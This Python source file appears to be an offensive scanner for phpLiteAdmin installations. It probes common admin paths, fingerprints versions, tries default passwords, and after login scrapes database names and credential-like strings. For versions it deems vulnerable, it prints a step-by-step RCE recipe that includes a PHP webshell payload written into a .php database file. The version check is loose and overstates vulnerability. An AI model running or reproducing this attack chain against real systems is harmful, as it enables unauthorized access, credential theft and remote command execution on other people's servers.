"""WVS v18 - phpLiteAdmin Scanner
phpLiteAdmin 探测、指纹识别、弱口令检测、数据库信息提取
支持攻击链: 发现 → 指纹 → 登录 → 信息提取 → RCE
"""
import asyncio
import re
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlparse
import aiohttp


@dataclass
class PHPLiteAdminResult:
    """phpLiteAdmin 扫描结果"""
    found: bool
    url: str = ""
    version: str = ""
    version_confidence: float = 0.0
    path: str = ""
    login_success: bool = False
    credentials_used: str = ""
    databases: List[Dict] = field(default_factory=list)
    credentials_leaked: List[Dict] = field(default_factory=list)
    is_vulnerable_rce: bool = False
    rce_info: str = ""
    error: str = ""


class PHPLiteAdminScanner:
    """phpLiteAdmin 专项扫描器"""

    # phpLiteAdmin 常见路径
    PATHS = [
        "/dbadmin/",
        "/dbadmin/index.php",
        "/dbadmin/test_db.php",
        "/phpliteadmin/",
        "/phpliteadmin/index.php",
        "/admin/phpliteadmin.php",
        "/phpadmin/phpliteadmin.php",
        "/sqlite/phpliteadmin.php",
        "/database/phpliteadmin.php",
        "/databases/phpliteadmin.php",
        "/phpLiteAdmin/",
        "/phpLiteAdmin/index.php",
        "/phpLiteAdmin/phpliteadmin.php",
    ]

    # 默认密码
    DEFAULT_PASSWORDS = [
        ("admin", ""),        # 空密码
        ("admin", "admin"),
        ("admin", "password"),
        ("root", ""),
        ("root", "root"),
    ]

    # 版本指纹特征
    VERSION_PATTERNS = [
        (r"phpLiteAdmin v?([\d.]+)", 0.95),
        (r"version = ['\"]?([\d.]+)['\"]?", 0.85),
        (r"<title>phpLiteAdmin ([\d.]+)</title>", 0.9),
        (r"phpLiteAdmin.*?([\d]+\.[\d]+(?:\.[\d]+)?)", 0.8),
    ]

    # RCE 漏洞版本
    RCE_VULNERABLE_VERSIONS = [
        "1.9.3",  # CVE-2012-5209 - Arbitrary PHP code execution via create_function
        "1.9.4",  # CVE-2013-2613 - Remote PHP code execution via SQLiteManager
        "1.9.5",
        "1.9.6",
        "1.9.7",
    ]

    # 信息泄露特征
    CREDENTIAL_PATTERNS = [
        (r"(\w+)\s*=\s*['\"]([a-f0-9]{32})['\"]", "MD5 hash"),
        (r"(\w+)\s*:\s*(\S+)", "credential format"),
        (r"username['\" ]*[:=][ '\"]([^'\"<>]+)['\"]", "username field"),
        (r"password['\" ]*[:=][ '\"]([^'\"<>]+)['\"]", "password field"),
    ]

    def __init__(self, config: Dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.session_cookies: Dict[str, str] = {}
        self.session_headers: Dict[str, str] = {}

    async def scan(self, base_url: str) -> PHPLiteAdminResult:
        """扫描目标站点的 phpLiteAdmin"""
        result = PHPLiteAdminResult(found=False)

        # 1. 探测 phpLiteAdmin 安装
        found_url = await self._find_installation(base_url)
        if not found_url:
            return result

        result.found = True
        result.url = found_url
        parsed = urlparse(found_url)
        result.path = parsed.path

        # 2. 获取版本信息
        version_info = await self._get_version(found_url)
        result.version = version_info["version"]
        result.version_confidence = version_info["confidence"]

        # 3. 尝试默认密码登录
        login_result = await self._try_default_login(found_url)
        if login_result["success"]:
            result.login_success = True
            result.credentials_used = login_result["credentials"]

            # 4. 登录成功后提取数据库信息
            db_info = await self._extract_database_info(found_url, login_result["cookies"])
            result.databases = db_info["databases"]
            result.credentials_leaked = db_info["credentials"]

            # 5. 检查 RCE 漏洞
            if result.version and self._is_rce_vulnerable(result.version):
                result.is_vulnerable_rce = True
                result.rce_info = self._get_rce_info(result.version)

        return result

    async def _find_installation(self, base_url: str) -> Optional[str]:
        """探测 phpLiteAdmin 安装"""
        for path in self.PATHS:
            test_url = urljoin(base_url.rstrip("/") + "/", path.lstrip("/"))
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(
                        test_url,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        allow_redirects=True
                    ) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            # 验证是否为 phpLiteAdmin 页面
                            if self._is_phpliteadmin(text):
                                return str(resp.url)
            except:
                continue
        return None

    def _is_phpliteadmin(self, content: str) -> bool:
        """判断页面是否为 phpLiteAdmin"""
        indicators = [
            "phpLiteAdmin",
            "phpliteadmin",
            "SQLite",
            "Create New Database",
            "Database browser",
        ]
        matches = sum(1 for ind in indicators if ind.lower() in content.lower())
        return matches >= 2

    async def _get_version(self, url: str) -> Dict:
        """提取 phpLiteAdmin 版本"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=self.timeout)
                ) as resp:
                    text = await resp.text()

                    for pattern, confidence in self.VERSION_PATTERNS:
                        match = re.search(pattern, text, re.IGNORECASE)
                        if match:
                            version = match.group(1).strip()
                            return {"version": version, "confidence": confidence}

                    # 尝试从 meta 标签提取
                    meta_match = re.search(r'<meta[^>]+content=[^>]*?([\d.]+)', text, re.I)
                    if meta_match:
                        return {"version": meta_match.group(1), "confidence": 0.6}

        except:
            pass

        return {"version": "unknown", "confidence": 0.0}

    async def _try_default_login(self, url: str) -> Dict:
        """尝试默认密码登录"""
        # 首先获取登录页面以提取 CSRF token 等
        login_page = await self._get_login_page(url)
        if not login_page:
            return {"success": False, "credentials": "", "cookies": {}}

        csrf_token = login_page.get("csrf_token", "")
        cookies = login_page.get("cookies", {})

        for username, password in self.DEFAULT_PASSWORDS:
            creds_str = f"{username}:{password or '(empty)'}"
            try:
                async with aiohttp.ClientSession() as session:
                    # 构造登录请求
                    login_data = aiohttp.FormData()
                    login_data.add_field("username", username)
                    login_data.add_field("password", password)
                    if csrf_token:
                        login_data.add_field("login", csrf_token)
                        login_data.add_field("filename", "")

                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                        "Referer": url,
                    }

                    async with session.post(
                        url,
                        data=login_data,
                        cookies=cookies,
                        headers=headers,
                        timeout=aiohttp.ClientTimeout(total=self.timeout),
                        allow_redirects=True
                    ) as resp:
                        text = await resp.text()
                        new_cookies = dict(resp.cookies)

                        # 检查登录是否成功
                        if self._is_login_success(text, resp.status, resp.url):
                            return {
                                "success": True,
                                "credentials": creds_str,
                                "cookies": new_cookies
                            }

            except Exception as e:
                continue

        return {"success": False, "credentials": "", "cookies": {}}

    async def _get_login_page(self, url: str) -> Dict:
        """获取登录页面信息"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(
                    url,
                    timeout=aiohttp.ClientTimeout(total=self.timeout)
                ) as resp:
                    text = await resp.text()
                    cookies = dict(resp.cookies)

                    # 提取 CSRF token
                    csrf_token = self._extract_csrf_token(text)

                    return {"csrf_token": csrf_token, "cookies": cookies}
        except:
            return {}

    def _extract_csrf_token(self, content: str) -> str:
        """提取 CSRF token"""
        patterns = [
            r'<input[^>]+name=["\']?filename["\']?[^>]+value=["\']([^"\']+)["\']',
            r'<input[^>]+value=["\']([^"\']+)["\'][^>]+name=["\']?filename["\']?',
            r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
            r'<input[^>]+id=["\']token["\']?[^>]+value=["\']([^"\']+)["\']',
        ]
        for pattern in patterns:
            match = re.search(pattern, content, re.I)
            if match:
                return match.group(1)
        return ""

    def _is_login_success(self, content: str, status: int, final_url) -> bool:
        """判断登录是否成功"""
        # 检查是否重定向到数据库页面
        if "database" in str(final_url).lower():
            return True

        # 检查是否有成功特征
        success_indicators = [
            "Create New Database",
            "Database Browser",
            "Your SQL queries",
            "Switch database",
        ]
        matches = sum(1 for ind in success_indicators if ind in content)
        if matches >= 1:
            return True

        # 检查是否还在登录页（失败）
        still_on_login = "login" in str(final_url).lower() and "password" in content.lower()
        if still_on_login:
            return False

        return False

    async def _extract_database_info(self, url: str, cookies: Dict) -> Dict:
        """提取数据库信息（需要登录后）"""
        databases = []
        credentials = []

        try:
            async with aiohttp.ClientSession() as session:
                # 获取主页面（数据库列表）
                async with session.get(
                    url,
                    cookies=cookies,
                    timeout=aiohttp.ClientTimeout(total=self.timeout)
                ) as resp:
                    content = await resp.text()

                    # 提取数据库名称
                    db_patterns = [
                        r'<a[^>]+href=["\'][^"\']*database=([^"&\']+)',
                        r'<td[^>]*class=["\'][^"\']*db[^"\']*["\'][^>]*>([^<]+)</td>',
                        r'Database:\s*<[^>]+>([^<]+)<',
                    ]
                    for pattern in db_patterns:
                        for match in re.finditer(pattern, content, re.I):
                            db_name = match.group(1).strip()
                            if db_name and len(db_name) < 100:
                                databases.append({
                                    "name": db_name,
                                    "source": "page"
                                })

                    # 提取可能的凭证信息
                    for cred_pattern, cred_type in self.CREDENTIAL_PATTERNS:
                        for match in re.finditer(cred_pattern, content):
                            if len(match.groups()) >= 2:
                                databases.append({
                                    "type": cred_type,
                                    "data": match.group(0),
                                    "source": "credential_pattern"
                                })
                                credentials.append({
                                    "type": cred_type,
                                    "match": match.group(0)
                                })

        except:
            pass

        return {"databases": databases, "credentials": credentials}

    def _is_rce_vulnerable(self, version: str) -> bool:
        """检查是否为 RCE 漏洞版本"""
        if version == "unknown" or not version:
            return False

        # 精确匹配
        if version in self.RCE_VULNERABLE_VERSIONS:
            return True

        # 主版本匹配 (e.g., 1.9 matches 1.9.3)
        for vuln_ver in self.RCE_VULNERABLE_VERSIONS:
            if version.startswith(vuln_ver.rsplit(".", 1)[0] + "."):
                return True
            if version.split(".")[0] == vuln_ver.split(".")[0] and version.split(".")[1] == vuln_ver.split(".")[1]:
                return True

        return False

    def _get_rce_info(self, version: str) -> str:
        """获取 RCE 漏洞信息"""
        rce_info_map = {
            "1.9.3": "CVE-2012-5209 - Arbitrary PHP code execution via create_function()",
            "1.9.4": "CVE-2013-2613 - Remote PHP code execution via SQLiteManager",
        }

        base_info = rce_info_map.get(version, f"Version {version} - Potential RCE via database manipulation")

        return f"""{base_info}

RCE Attack Vector:
1. Create new database with .php extension (e.g., shell.php)
2. Insert PHP payload: <?php system($_GET['cmd']); ?>
3. Access the database file directly via LFI or direct URL
4. Execute commands via ?cmd=<command>"""

    def format_result(self, result: PHPLiteAdminResult) -> str:
        """格式化扫描结果"""
        if not result.found:
            return "[-] phpLiteAdmin not found"

        lines = []
        lines.append(f"[+] phpLiteAdmin found: {result.url}")

        if result.version:
            lines.append(f"    Version: {result.version} (confidence: {result.version_confidence:.0%})")

        if result.login_success:
            lines.append(f"[+] Login SUCCESS with: {result.credentials_used}")

            if result.databases:
                lines.append(f"    Databases found: {len(result.databases)}")
                for db in result.databases[:5]:  # 最多显示5个
                    if "name" in db:
                        lines.append(f"      - {db['name']}")

            if result.credentials_leaked:
                lines.append(f"    Credentials leaked: {len(result.credentials_leaked)}")
                for cred in result.credentials_leaked[:3]:
                    lines.append(f"      - {cred['type']}: {cred['match'][:50]}")

            if result.is_vulnerable_rce:
                lines.append(f"\n[!] RCE VULNERABLE: {result.version}")
                lines.append(f"    {result.rce_info}")
        else:
            lines.append("[-] Default login failed")

        return "\n".join(lines)


# 独立扫描函数
async def scan_phpliteadmin(target_url: str, config: Dict = None) -> PHPLiteAdminResult:
    """对目标 URL 进行 phpLiteAdmin 扫描"""
    scanner = PHPLiteAdminScanner(config)
    return await scanner.scan(target_url)


if __name__ == "__main__":
    import sys

    async def main():
        if len(sys.argv) < 2:
            print("Usage: python phpliteadmin_scanner.py <url>")
            return

        target = sys.argv[1]
        print(f"[*] Scanning {target} for phpLiteAdmin...")

        scanner = PHPLiteAdminScanner()
        result = await scanner.scan(target)

        print(scanner.format_result(result))

    asyncio.run(main())
